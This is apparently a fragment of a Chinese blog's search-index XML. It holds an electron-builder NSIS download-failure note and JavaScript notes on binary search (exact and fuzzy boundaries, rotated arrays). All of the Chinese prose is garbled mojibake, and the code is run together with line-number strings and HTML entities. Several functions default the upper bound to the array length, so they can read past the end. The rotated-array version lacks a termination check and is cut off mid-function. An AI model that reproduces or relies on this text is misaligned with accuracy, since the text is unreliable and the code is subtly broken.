connection was forcibly closed by the remote host. è§£å†³æ–¹æ¡ˆgithub ä¸Šæ‰¾åˆ° electron æ‰“åŒ…äºŒè¿›åˆ¶æ–‡ä»¶ releasesï¼Œé€‰æ‹©æŠ¥é”™éœ€è¦çš„ç‰ˆæœ¬çš„ nsis å®‰è£…åŒ…ä¸‹è½½ï¼Œä¸‹è½½è§£åŽ‹åŽï¼Œæ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆå¸¦ç‰ˆæœ¬å·ç›¸å…³ä¿¡æ¯ï¼‰æ”¾åˆ°ä»¥ä¸‹ç›®å½•ä¸‹ 123macOS ~/Library/Caches/electron-builder/nsislinux ~/.cache/electron-builder/nsiswindows %LOCALAPPDATA%\electron-builder\cache\nsis èŽ·å–ä¸åˆ° nsis-resources-x.x.x.7zç»§ç»­æ‰“åŒ…ä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œç”±äºŽç½‘ç»œåŽŸå› èŽ·å–ä¸åˆ° nsis-resources å®‰è£…åŒ…ã€‚ 1â¨¯ Get "https://github-production-release-asset-2e65be.s3.amazonaws.com/65527128/64ac4a00-a87a-11e9-901b-f221c4fd0776?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201226%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20201226T070558Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=c970d23f54d01a83f3bcfab03a56d7ed6b18e9cd8d5ecd46bd8dc66cd47ae077&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=65527128&amp;response-content-disposition=attachment%3B%20filename%3Dnsis-resources-3.4.1.7z&amp;response-content-type=application%2Foctet-stream": read tcp 100.119.114.140:63484-&gt;52.216.92.123:443: wsarecv: An existing connection was forcibly closed by the remote host. è§£å†³æ–¹æ¡ˆgithub ä¸Šæ‰¾åˆ° electron æ‰“åŒ…äºŒè¿›åˆ¶æ–‡ä»¶ releasesï¼Œé€‰æ‹©æŠ¥é”™éœ€è¦çš„ç‰ˆæœ¬çš„ nsis-resources å®‰è£…åŒ…ä¸‹è½½ï¼Œä¸‹è½½è§£åŽ‹åŽï¼Œæ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆå¸¦ç‰ˆæœ¬å·ç›¸å…³ä¿¡æ¯ï¼‰æ”¾åˆ°ä»¥ä¸‹ç›®å½•ä¸‹ 123macOS ~/Library/Caches/electron-builder/nsislinux ~/.cache/electron-builder/nsiswindows %LOCALAPPDATA%\electron-builder\cache\nsis]]></content>
      <tags>
        <tag>electron</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Œè¶…è¯¦ç¬”è®°ã€ç®—æ³•â€”â€”äºŒåˆ†æœç´¢ä¸Žè´ªå©ªï¼ˆJSç‰ˆï¼‰]]></title>
    <url>%2F2020%2F12%2F12%2Falgorithm-binary-search-greedy%2F</url>
    <content type="text"><![CDATA[äºŒåˆ†æœç´¢ï¼ˆBinary Searchï¼‰äºŒåˆ†æœç´¢ï¼ˆæŠ˜åŠæœç´¢ï¼‰çš„ Wikipedia å®šä¹‰ï¼šæ˜¯ä¸€ç§åœ¨æœ‰åºæ•°ç»„ä¸­æŸ¥æ‰¾æŸä¸€ç‰¹å®šå…ƒç´ çš„æœç´¢ç®—æ³•ã€‚ä»Žå®šä¹‰å¯çŸ¥ï¼Œè¿ç”¨äºŒåˆ†æœç´¢çš„å‰ææ˜¯æ•°ç»„å¿…é¡»æ˜¯æŽ’å¥½åºçš„ã€‚å¦å¤–ï¼Œè¾“å…¥å¹¶ä¸ä¸€å®šæ˜¯æ•°ç»„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ç»™å®šä¸€ä¸ªåŒºé—´çš„èµ·å§‹å’Œç»ˆæ­¢çš„ä½ç½®ã€‚ ä¼˜ç‚¹ï¼šæ—¶é—´å¤æ‚åº¦æ˜¯ O(lgn)ï¼Œéžå¸¸é«˜æ•ˆã€‚ å› æ­¤ä¹Ÿç§°ä¸ºå¯¹æ•°æœç´¢ã€‚ ç¼ºç‚¹ï¼šè¦æ±‚å¾…æŸ¥æ‰¾çš„æ•°ç»„æˆ–è€…åŒºé—´æ˜¯æŽ’å¥½åºçš„ã€‚ å¯¹æ•°ç»„è¿›è¡ŒåŠ¨æ€çš„åˆ é™¤å’Œæ’å…¥æ“ä½œå¹¶å®ŒæˆæŸ¥æ‰¾ï¼Œå¹³å‡å¤æ‚åº¦ä¼šå˜ä¸º O(n)ã€‚æ­¤æ—¶åº”å½“è€ƒè™‘é‡‡å–è‡ªå¹³è¡¡çš„äºŒå‰æŸ¥æ‰¾æ ‘ï¼š åœ¨ O(nlogn) çš„æ—¶é—´å†…ç”¨ç»™å®šçš„æ•°æ®æž„å»ºå‡ºä¸€æ£µäºŒå‰æŸ¥æ‰¾æ ‘ï¼› åœ¨ O(logn) çš„æ—¶é—´é‡Œå¯¹ç›®æ ‡æ•°æ®è¿›è¡Œæœç´¢ï¼› åœ¨ O(logn) çš„æ—¶é—´é‡Œå®Œæˆåˆ é™¤å’Œæ’å…¥çš„æ“ä½œã€‚ å› æ­¤ï¼Œå½“è¾“å…¥çš„æ•°ç»„æˆ–è€…åŒºé—´æ˜¯æŽ’å¥½åºçš„ï¼ŒåŒæ—¶åˆä¸ä¼šç»å¸¸å˜åŠ¨ï¼Œè€Œè¦æ±‚ä»Žé‡Œé¢æ‰¾å‡ºä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å…ƒç´ çš„æ—¶å€™ï¼ŒäºŒåˆ†æœç´¢å°±æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚ äºŒåˆ†æœç´¢ä¸€èˆ¬åŒ–çš„è§£é¢˜æ€è·¯å¦‚ä¸‹ã€‚ ä»Žå·²ç»æŽ’å¥½åºçš„æ•°ç»„æˆ–åŒºé—´ä¸­å–å‡ºä¸­é—´ä½ç½®çš„å…ƒç´ ï¼Œåˆ¤æ–­è¯¥å…ƒç´ æ˜¯å¦æ»¡è¶³è¦æœç´¢çš„æ¡ä»¶ï¼Œå¦‚æžœæ»¡è¶³ï¼Œåœæ­¢æœç´¢ï¼Œç¨‹åºç»“æŸã€‚ å¦‚æžœæ­£ä¸­é—´çš„å…ƒç´ ä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä»Žå®ƒä¸¤è¾¹çš„åŒºåŸŸè¿›è¡Œæœç´¢ã€‚ç”±äºŽæ•°ç»„æ˜¯æŽ’å¥½åºçš„ï¼Œå¯ä»¥åˆ©ç”¨æŽ’é™¤æ³•ï¼Œç¡®å®šæŽ¥ä¸‹æ¥åº”è¯¥ä»Žè¿™ä¸¤ä¸ªåŒºé—´ä¸­çš„å“ªä¸€ä¸ªåŽ»æœç´¢ã€‚ é€šè¿‡åˆ¤æ–­ï¼Œå¦‚æžœå‘çŽ°çœŸæ­£è¦æ‰¾çš„å…ƒç´ åœ¨å·¦åŠåŒºé—´çš„è¯ï¼Œå°±ç»§ç»­åœ¨å·¦åŠåŒºé—´é‡Œè¿›è¡ŒäºŒåˆ†æœç´¢ã€‚åä¹‹ï¼Œå°±åœ¨å³åŠåŒºé—´é‡Œè¿›è¡ŒäºŒåˆ†æœç´¢ã€‚ äºŒåˆ†æœç´¢é€’å½’è§£æ³•ä¼˜ç‚¹ï¼šç®€æ´ï¼›ç¼ºç‚¹ï¼šæ‰§è¡Œæ¶ˆè€—å¤§ ä¾‹é¢˜ï¼šå‡è®¾æˆ‘ä»¬è¦ä»Žä¸€ä¸ªæŽ’å¥½åºçš„æ•°ç»„é‡Œ {1, 3, 4, 6, 7, 8, 10, 13, 14} æŸ¥çœ‹ä¸€ä¸‹æ•°å­— 7 æ˜¯å¦åœ¨é‡Œé¢ï¼Œå¦‚æžœåœ¨ï¼Œè¿”å›žå®ƒçš„ä¸‹æ ‡ï¼Œå¦åˆ™è¿”å›ž -1ã€‚ äºŒåˆ†æœç´¢é€’å½’è§£æ³•ä»£ç å®žçŽ°1234567891011121314151617181920212223242526272829// é€’å½’è§£æ³•ï¼Œè¿›è¡ŒäºŒåˆ†æœç´¢const binarySearch = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high // ä¸ºäº†é¿å…æ— çº¿å¾ªçŽ¯ï¼Œå…ˆåˆ¤æ–­ï¼Œå¦‚æžœä¸ƒç‚¹ä½ç½®å¤§äºŽç»ˆç‚¹ä½ç½®ï¼Œè¡¨æ˜Žè¿™æ˜¯ä¸€ä¸ªéžæ³•çš„åŒºé—´ // å·²ç»å°è¯•äº†æ‰€æœ‰çš„æœç´¢åŒºé—´è¿˜æ˜¯æ²¡æ‰¾åˆ°ç»“æžœï¼Œè¿”å›ž-1 if (low &gt; high) &#123; return -1 &#125; // å–æ­£ä¸­é—´é‚£ä¸ªæ•°çš„ä¸‹æ ‡ middle let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­ä¸€ä¸‹æ­£ä¸­é—´çš„é‚£ä¸ªæ•°æ˜¯ä¸æ˜¯è¦æ‰¾çš„ç›®æ ‡æ•° target if (nums[middle] === target) &#123; return middle &#125; // å¦‚æžœå‘çŽ°ç›®æ ‡æ•°åœ¨å·¦è¾¹ï¼Œå°±é€’å½’åœ°ä»Žå·¦è¾¹è¿›è¡ŒäºŒåˆ†æœç´¢ // å¦åˆ™ä»Žå³åŠè¾¹é€’å½’åœ°äºŒåˆ†æœç´¢ if (target &lt; nums[middle]) &#123; return binarySearch(nums, target, low, middle - 1) &#125; else &#123; return binarySearch(nums, target, middle + 1, high) &#125;&#125;const arr = [1, 3, 4, 6, 7, 8, 10, 13, 14]console.log('index: ', binarySearch(arr, 7))// index: 4 æ³¨æ„ï¼š åœ¨è®¡ç®— middle ä¸‹æ ‡çš„æ—¶å€™ï¼Œä¸èƒ½ç®€å•åœ°ç”¨ (low + hight) / 2ï¼Œå¯èƒ½ä¼šå¯¼è‡´æº¢å‡ºã€‚ åœ¨å–å·¦åŠè¾¹ä»¥åŠå³åŠè¾¹çš„åŒºé—´æ—¶ï¼Œå·¦åŠè¾¹æ˜¯ [low, middle - 1]ï¼Œå³åŠè¾¹æ˜¯ [middle + 1, high]ï¼Œè¿™æ˜¯ä¸¤ä¸ªé—­åŒºé—´ã€‚å› ä¸ºå·²ç»ç¡®å®šäº† middle é‚£ä¸ªç‚¹ä¸æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ï¼Œå°±æ²¡æœ‰å¿…è¦å†æŠŠå®ƒåŠ å…¥åˆ°å·¦ã€å³åŠè¾¹äº†ã€‚ å¯¹äºŽä¸€ä¸ªé•¿åº¦ä¸ºå¥‡æ•°çš„æ•°ç»„ï¼Œä¾‹å¦‚ï¼š{1, 2, 3, 4, 5}ï¼ŒæŒ‰ç…§ low + (high - low) / 2 æ¥è®¡ç®—ï¼Œmiddle å°±æ˜¯æ­£ä¸­é—´çš„é‚£ä¸ªä½ç½®ï¼Œå¯¹äºŽä¸€ä¸ªé•¿åº¦ä¸ºå¶æ•°çš„æ•°ç»„ï¼Œä¾‹å¦‚ {1, 2, 3, 4}ï¼Œmiddle å°±æ˜¯æ­£ä¸­é—´é å·¦è¾¹çš„ä¸€ä¸ªä½ç½®ã€‚ äºŒåˆ†æœç´¢é€’å½’è§£æ³•æ—¶é—´å¤æ‚åº¦å‡è®¾æˆ‘ä»¬è¦å¯¹é•¿åº¦ä¸º n çš„æ•°ç»„è¿›è¡ŒäºŒåˆ†æœç´¢ï¼ŒT(n) æ˜¯æ‰§è¡Œæ—¶é—´å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ° T(n) = T(n/2) + 1 ä»£å…¥å…¬å¼æ³•å¾—ï¼ša = 1ï¼Œb = 2ï¼Œf(n) = 1ï¼Œå› æ­¤ï¼šO(nlog(b)a) = O(n0) = 1 ç­‰äºŽ O(f(n))ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(nlog(b)alogn) = O(logn)ã€‚ äºŒåˆ†æœç´¢éžé€’å½’è§£æ³•ä»£ç å®žçŽ°äºŒåˆ†æœç´¢é€’å½’è§£æ³•å®žé™…æ˜¯å°† low å’Œ high ä¸æ–­å‘ target é æ‹¢çš„è¿‡ç¨‹ã€‚å…¶å®žï¼Œå¯ä»¥å°†è¿™ä¸ªè¿‡ç¨‹é€šè¿‡ middle äº¤æ¢èµ‹å€¼å¾ªçŽ¯æ–¹å¼æ›¿ä»£ï¼Œä»Žè€Œå˜æˆéžé€’å½’å½¢å¼ã€‚ 123456789101112131415161718192021222324252627282930// éžé€’å½’è§£æ³•ï¼Œè¿›è¡ŒäºŒåˆ†æœç´¢const binarySearch = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high // åœ¨ while å¾ªçŽ¯é‡Œï¼Œåˆ¤æ–­æœç´¢çš„åŒºé—´èŒƒå›´æ˜¯å¦æœ‰æ•ˆ while (low &lt;= high) &#123; let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­ä¸€ä¸‹æ­£ä¸­é—´çš„é‚£ä¸ªæ•°æ˜¯ä¸æ˜¯è¦æ‰¾çš„ç›®æ ‡æ•° target if (nums[middle] === target) &#123; return middle &#125; // å¦‚æžœå‘çŽ°ç›®æ ‡æ•°åœ¨å·¦è¾¹ï¼Œè°ƒæ•´æœç´¢åŒºé—´çš„ç»ˆç‚¹ä¸º middle - 1 // å¦åˆ™ï¼Œè°ƒæ•´æœç´¢åŒºé—´çš„èµ·ç‚¹ä¸º middle + 1 if (target &lt; nums[middle]) &#123; high = middle - 1 &#125; else &#123; low = middle + 1 &#125; &#125; // å¦‚æžœè¶…å‡ºæœç´¢åŒºé—´ï¼Œè¡¨æ˜Žæ— æ³•æ‰¾åˆ°ç›®æ ‡æ•°ï¼Œè¿”å›ž -1 return -1&#125;const arr = [1, 3, 4, 6, 7, 8, 10, 13, 14]console.log('index: ', binarySearch(arr, 7))// index: 4 äºŒåˆ†æœç´¢ï¼šæ‰¾ç¡®å®šçš„è¾¹ç•Œé—®é¢˜è¾¹ç•Œåˆ†ä¸Šè¾¹ç•Œå’Œä¸‹è¾¹ç•Œï¼Œæœ‰æ—¶å€™ä¹Ÿè¢«æˆä¸ºå³è¾¹ç•Œå’Œå·¦è¾¹ç•Œã€‚ç¡®å®šçš„è¾¹ç•ŒæŒ‡è¾¹ç•Œçš„æ•°å€¼ç­‰äºŽè¦æ‰¾çš„ç›®æ ‡æ•°ã€‚ ä¾‹é¢˜ï¼šLeetCode ç¬¬ 34 é¢˜ï¼Œåœ¨ä¸€ä¸ªæŽ’å¥½åºçš„æ•°ç»„ä¸­æ‰¾å‡ºæŸä¸ªæ•°ç¬¬ä¸€æ¬¡å‡ºçŽ°å’Œæœ€åŽä¸€æ¬¡å‡ºçŽ°çš„ä¸‹æ ‡ä½ç½®ã€‚ ç¤ºä¾‹ï¼šè¾“å…¥çš„æ•°ç»„æ˜¯ï¼š[5, 7, 7, 8, 8, 10]ï¼Œç›®æ ‡æ•°æ˜¯ 8ï¼Œé‚£ä¹ˆè¿”å›ž [3, 4]ï¼Œå…¶ä¸­ 3 æ˜¯ 8 ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„ä¸‹æ ‡ä½ç½®ï¼Œ4 æ˜¯ 8 æœ€åŽä¸€æ¬¡å‡ºçŽ°çš„ä¸‹æ ‡ä½ç½®ã€‚ äºŒåˆ†æœç´¢æ‰¾ç¡®å®šçš„è¾¹ç•Œé—®é¢˜è§£é¢˜æ€è·¯åœ¨äºŒåˆ†æœç´¢é‡Œï¼Œæ¯”è¾ƒéš¾çš„æ˜¯åˆ¤æ–­é€»è¾‘ï¼Œå¯¹è¿™é“é¢˜æ¥è¯´ï¼Œä»€ä¹ˆæ—¶å€™çŸ¥é“è¿™ä¸ªä½ç½®æ˜¯ä¸æ˜¯ 8 ç¬¬ä¸€æ¬¡ä»¥åŠæœ€åŽå‡ºçŽ°çš„åœ°æ–¹å‘¢ï¼Ÿ æŠŠç¬¬ä¸€æ¬¡å‡ºçŽ°çš„åœ°æ–¹å«ä¸‹è¾¹ç•Œï¼ˆlower boundï¼‰ï¼ŒæŠŠæœ€åŽä¸€æ¬¡å‡ºçŽ°çš„åœ°æ–¹å«ä¸Šè¾¹ç•Œï¼ˆupper boundï¼‰ã€‚ é‚£ä¹ˆæˆä¸º 8 çš„ä¸‹è¾¹ç•Œçš„æ¡ä»¶åº”è¯¥æœ‰ä¸¤ä¸ªã€‚ è¯¥æ•°å¿…é¡»æ˜¯ 8ï¼› è¯¥æ•°çš„å·¦è¾¹ä¸€ä¸ªæ•°å¿…é¡»ä¸æ˜¯ 8ï¼š 8 çš„å·¦è¾¹æœ‰æ•°ï¼Œé‚£ä¹ˆè¯¥æ•°å¿…é¡»å°äºŽ 8ï¼›8 çš„å·¦è¾¹æ²¡æœ‰æ•°ï¼Œå³ 8 æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªæ•°ã€‚ è€Œæˆä¸º 8 çš„ä¸Šè¾¹ç•Œçš„æ¡ä»¶ä¹Ÿåº”è¯¥æœ‰ä¸¤ä¸ªã€‚ è¯¥æ•°å¿…é¡»æ˜¯ 8ï¼› è¯¥æ•°çš„å³è¾¹ä¸€ä¸ªæ•°å¿…é¡»ä¸æ˜¯ 8ï¼š 8 çš„å³è¾¹æœ‰æ•°ï¼Œé‚£ä¹ˆè¯¥æ•°å¿…é¡»å¤§äºŽ 8ï¼›8 çš„å³è¾¹æ²¡æœ‰æ•°ï¼Œå³ 8 æ˜¯æ•°ç»„çš„æœ€åŽä¸€ä¸ªæ•°ã€‚ äºŒåˆ†æœç´¢æ‰¾ç¡®å®šçš„è¾¹ç•Œé—®é¢˜ä»£ç å®žçŽ°ç”¨é€’å½’çš„æ–¹æ³•æ¥å¯»æ‰¾ä¸‹è¾¹ç•Œï¼Œä»£ç å¦‚ä¸‹ã€‚ 12345678910111213141516171819202122232425// äºŒåˆ†æ³•æŸ¥æ‰¾ä¸‹è¾¹ç•Œconst searchLowerBound = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high if (low &gt; high) &#123; return -1 &#125; let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­æ˜¯å¦æ˜¯ä¸‹è¾¹ç•Œæ—¶ï¼Œ å…ˆçœ‹çœ‹ middle çš„æ•°æ˜¯å¦ä¸º target ï¼Œå¹¶åˆ¤æ–­è¯¥æ•°å­—ã€æ˜¯å¦å·²ä¸ºæ•°ç»„ç¬¬ä¸€ä¸ªæ•° // æˆ–è€…ï¼Œå®ƒå·¦è¾¹çš„ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯å·²ç»æ¯”å®ƒå°ï¼Œå¦‚æžœéƒ½æ»¡è¶³ï¼Œå³ä¸ºä¸‹è¾¹ç•Œ if (nums[middle] === target &amp;&amp; (middle === 0 || nums[middle - 1] &lt; target)) &#123; return middle &#125; // å¦‚æžœå‘çŽ°ç›®æ ‡æ•°åœ¨å·¦è¾¹ï¼Œå°±é€’å½’åœ°ä»Žå·¦è¾¹è¿›è¡ŒäºŒåˆ†æœç´¢ // å¦åˆ™ä»Žå³åŠè¾¹é€’å½’åœ°äºŒåˆ†æœç´¢ if (target &lt;= nums[middle]) &#123; return searchLowerBound(nums, target, low, middle - 1) &#125; else &#123; return searchLowerBound(nums, target, middle + 1, high) &#125;&#125; æŸ¥æ‰¾ä¸Šè¾¹ç•Œçš„ä»£ç å¦‚ä¸‹ã€‚ 12345678910111213141516171819202122232425// äºŒåˆ†æ³•æŸ¥æ‰¾ä¸Šè¾¹ç•Œconst searchUpperBound = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high if (low &gt; high) &#123; return -1 &#125; let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­æ˜¯å¦æ˜¯ä¸Šè¾¹ç•Œæ—¶ï¼Œå…ˆçœ‹çœ‹ middle çš„æ•°æ˜¯å¦ä¸º targetï¼Œå¹¶åˆ¤æ–­è¯¥æ•°æ˜¯å¦å·²ä¸ºæ•°ç»„çš„æœ€åŽä¸€ä¸ªæ•°ï¼Œ // æˆ–è€…ï¼Œå®ƒå³è¾¹çš„æ•°æ˜¯ä¸æ˜¯æ¯”å®ƒå¤§ï¼Œå¦‚æžœéƒ½æ»¡è¶³ï¼Œå³ä¸ºä¸Šè¾¹ç•Œ if (nums[middle] === target &amp;&amp; (middle === nums.length - 1 || nums[middle + 1] &gt; target)) &#123; return middle &#125; // å¦‚æžœå‘çŽ°ç›®æ ‡æ•°åœ¨å·¦è¾¹ï¼Œå°±é€’å½’åœ°ä»Žå·¦è¾¹è¿›è¡ŒäºŒåˆ†æœç´¢ // å¦åˆ™ä»Žå³åŠè¾¹é€’å½’åœ°äºŒåˆ†æœç´¢ if (target &lt; nums[middle]) &#123; return searchUpperBound(nums, target, low, middle - 1) &#125; else &#123; return searchUpperBound(nums, target, middle + 1, high) &#125;&#125; äºŒåˆ†æœç´¢ï¼šæ‰¾æ¨¡ç³Šè¾¹ç•Œé—®é¢˜äºŒåˆ†æœç´¢å¯ä»¥ç”¨æ¥æŸ¥æ‰¾ä¸€äº›æ¨¡ç³Šçš„è¾¹ç•Œã€‚æ¨¡ç³Šçš„è¾¹ç•ŒæŒ‡ï¼Œè¾¹ç•Œçš„å€¼å¹¶ä¸ç­‰äºŽç›®æ ‡çš„å€¼ï¼Œè€Œæ˜¯å¤§äºŽæˆ–è€…å°äºŽç›®æ ‡çš„å€¼ã€‚ ä¾‹é¢˜ï¼šä»Žæ•°ç»„ [-2, 0, 1, 4, 7, 9, 10] ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºŽ 6 çš„æ•°ã€‚ äºŒåˆ†æœç´¢æ‰¾æ¨¡ç³Šè¾¹ç•Œé—®é¢˜è§£é¢˜æ€è·¯åœ¨ä¸€ä¸ªæŽ’å¥½åºçš„æ•°ç»„é‡Œï¼Œåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ç¬¬ä¸€ä¸ªå¤§äºŽ 6 çš„æ•°ï¼Œåªè¦å®ƒæ»¡è¶³å¦‚ä¸‹çš„æ¡ä»¶ï¼š è¯¥æ•°è¦å¤§äºŽ 6ï¼› è¯¥æ•°æœ‰å¯èƒ½æ˜¯æ•°ç»„é‡Œçš„ç¬¬ä¸€ä¸ªæ•°ï¼Œæˆ–è€…å®ƒä¹‹å‰çš„ä¸€ä¸ªæ•°æ¯” 6 å°ã€‚åªè¦æ»¡è¶³äº†ä¸Šé¢çš„æ¡ä»¶å°±æ˜¯ç¬¬ä¸€ä¸ªå¤§äºŽ 6 çš„æ•°ã€‚ äºŒåˆ†æœç´¢æ‰¾æ¨¡ç³Šè¾¹ç•Œé—®é¢˜ä»£ç å®žçŽ°12345678910111213141516171819202122232425262728// å¯¹äºŽæŸ¥æ‰¾æ¨¡ç³Šè¾¹ç•Œï¼Œè¿›è¡ŒäºŒåˆ†æœç´¢const firstGreaterThan = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high if (low &gt; high) &#123; return null &#125; let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­ middle æŒ‡å‘çš„æ•°æ˜¯å¦ä¸ºç¬¬ä¸€ä¸ªæ¯” target å¤§çš„æ•°æ—¶ï¼Œé¡»åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š // middle è¿™ä¸ªæ•°å¿…é¡»å¤§äºŽ target // middle è¦ä¹ˆæ˜¯ç¬¬ä¸€ä¸ªæ•°ï¼Œè¦ä¹ˆå®ƒä¹‹å‰çš„æ•°å°äºŽæˆ–ç­‰äºŽ target if (nums[middle] &gt; target &amp;&amp; (middle === 0 || nums[middle - 1] &lt;= target)) &#123; return middle &#125; if (target &lt; nums[middle]) &#123; return firstGreaterThan(nums, target, low, middle - 1) &#125; else &#123; return firstGreaterThan(nums, target, middle + 1, high) &#125;&#125;const arr = [-2, 0, 1, 4, 7, 9, 10]console.log(firstGreaterThan(arr, 6))// 4 äºŒåˆ†æœç´¢ï¼šæ—‹è½¬è¿‡çš„æŽ’åºæ•°ç»„äºŒåˆ†æœç´¢ä¹Ÿèƒ½åœ¨ç»è¿‡æ—‹è½¬äº†çš„æŽ’åºæ•°ç»„ä¸­è¿›è¡Œã€‚ ä¾‹é¢˜ï¼šLeetCode ç¬¬ 33 é¢˜ï¼Œç»™å®šä¸€ä¸ªç»è¿‡æ—‹è½¬äº†çš„æŽ’åºæ•°ç»„ï¼Œåˆ¤æ–­ä¸€ä¸‹æŸä¸ªæ•°æ˜¯å¦åœ¨é‡Œé¢ã€‚ ç¤ºä¾‹ï¼šç»™å®šæ•°ç»„ä¸º [4, 5, 6, 7, 0, 1, 2]ï¼Œtarget ç­‰äºŽ 0ï¼Œç­”æ¡ˆæ˜¯ 4ï¼Œå³ 0 æ‰€åœ¨çš„ä½ç½®ä¸‹æ ‡æ˜¯ 4ã€‚ äºŒåˆ†æœç´¢æ‰¾æ—‹è½¬è¿‡çš„æŽ’åºæ•°ç»„é—®é¢˜è§£é¢˜æ€è·¯å¯¹äºŽè¿™é“é¢˜ï¼Œè¾“å…¥æ•°ç»„ä¸æ˜¯å®Œæ•´æŽ’å¥½åºï¼Œè¿˜èƒ½è¿ç”¨äºŒåˆ†æœç´¢å—ï¼Ÿæ€è·¯å¦‚ä¸‹ã€‚ ä¸€å¼€å§‹ï¼Œä¸­ä½æ•°æ˜¯ 7ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ 0ï¼Œå¦‚ä½•åˆ¤æ–­å¾€å·¦è¾¹è¿˜æ˜¯å³è¾¹æœç´¢å‘¢ï¼Ÿè¿™ä¸ªæ•°ç»„æ˜¯ç»è¿‡æ—‹è½¬çš„ï¼Œå³ï¼Œä»Žæ•°ç»„ä¸­çš„æŸä¸ªä½ç½®å¼€å§‹åˆ’åˆ†ï¼Œå·¦è¾¹å’Œå³è¾¹éƒ½æ˜¯æŽ’å¥½åºçš„ã€‚ å¦‚ä½•åˆ¤æ–­å·¦è¾¹æ˜¯ä¸æ˜¯æŽ’å¥½åºçš„é‚£ä¸ªéƒ¨åˆ†å‘¢ï¼Ÿåªè¦æ¯”è¾ƒ nums[low] å’Œ nums[middle]ã€‚nums[low] &lt;= nums[middle] æ—¶ï¼Œèƒ½åˆ¤å®šå·¦è¾¹è¿™éƒ¨åˆ†ä¸€å®šæ˜¯æŽ’å¥½åºçš„ï¼Œå¦åˆ™ï¼Œå³è¾¹éƒ¨åˆ†ä¸€å®šæ˜¯æŽ’å¥½åºçš„ã€‚ ä¸ºä»€ä¹ˆè¦åˆ¤æ–­ nums[low] = nums[middle] çš„æƒ…å†µå‘¢ï¼Ÿå› ä¸ºè®¡ç®— middle çš„å…¬å¼æ˜¯ int middle = low + (high - low) / 2ã€‚ å½“åªæœ‰ä¸€ä¸ªæ•°çš„æ—¶å€™ï¼Œlow=highï¼Œmiddle=owï¼ŒåŒæ ·è®¤ä¸ºè¿™ä¸€è¾¹æ˜¯æŽ’å¥½åºçš„ã€‚ åˆ¤å®šæŸä¸€è¾¹æ˜¯æŽ’å¥½åºçš„ï¼Œæœ‰ä»€ä¹ˆç”¨å¤„å‘¢ï¼Ÿèƒ½å‡†ç¡®åœ°åˆ¤æ–­ç›®æ ‡å€¼æ˜¯å¦åœ¨è¿™ä¸ªåŒºé—´é‡Œã€‚å¦‚æžœ nums[low] &lt;= target &amp;&amp; target &lt; nums[middle]ï¼Œåˆ™åº”è¯¥åœ¨è¿™ä¸ªåŒºé—´é‡Œæœç´¢ç›®æ ‡å€¼ã€‚åä¹‹ï¼Œç›®æ ‡å€¼è‚¯å®šåœ¨å¦å¤–ä¸€è¾¹ã€‚ äºŒåˆ†æœç´¢æ‰¾æ—‹è½¬è¿‡çš„æŽ’åºæ•°ç»„é—®é¢˜ä»£ç å®žçŽ°1234567891011121314151617181920212223242526272829303132333435// å¯¹äºŽæ—‹è½¬è¿‡çš„æŽ’åºæ•°ç»„ï¼Œè¿›è¡ŒäºŒåˆ†æœç´¢const binarySearch = function (nums, target, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? nums.length : high let middle = low + Math.floor((high - low) / 2) // åˆ¤æ–­ä¸­ä½æ•°æ˜¯å¦è¦æ‰¾çš„æ•° if (nums[middle] === target) &#123; return middle &#125; // åˆ¤æ–­å·¦åŠè¾¹æ˜¯ä¸æ˜¯æŽ’å¥½åº if (nums[low] &lt;= nums[middle]) &#123; // åˆ¤æ–­ç›®æ ‡å€¼æ˜¯å¦åœ¨å·¦åŠè¾¹ // æ˜¯ï¼Œåˆ™åœ¨å·¦åŠè¾¹æœç´¢ // å¦ï¼Œåˆ™åœ¨å³åŠè¾¹æœç´¢ if (nums[low] &lt;= target &amp;&amp; target &lt; nums[middle]) &#123; return binarySearch(nums, target, low, middle - 1) &#125; return binarySearch(nums, target, middle + 1, high) &#125; else &#123; // å³åŠè¾¹æ˜¯æŽ’å¥½åºçš„é‚£ä¸€åŠï¼Œåˆ¤æ–­ç›®æ ‡å€¼æ˜¯å¦åœ¨å³è¾¹ // æ˜¯ï¼Œåˆ™åœ¨å³åŠè¾¹ç»§ç»­è¿›è¡ŒäºŒåˆ†æœç´¢ // å¦ï¼Œåˆ™åœ¨å·¦åŠè¾¹è¿›è¡ŒäºŒåˆ†æœç´¢ if (nums[middle] &lt; target &amp;&amp; target &lt;= nums[high]) &#123; return binarySearch(nums, target, middle + 1, high) &#125; return binarySearch(nums, target, low, middle - 1) 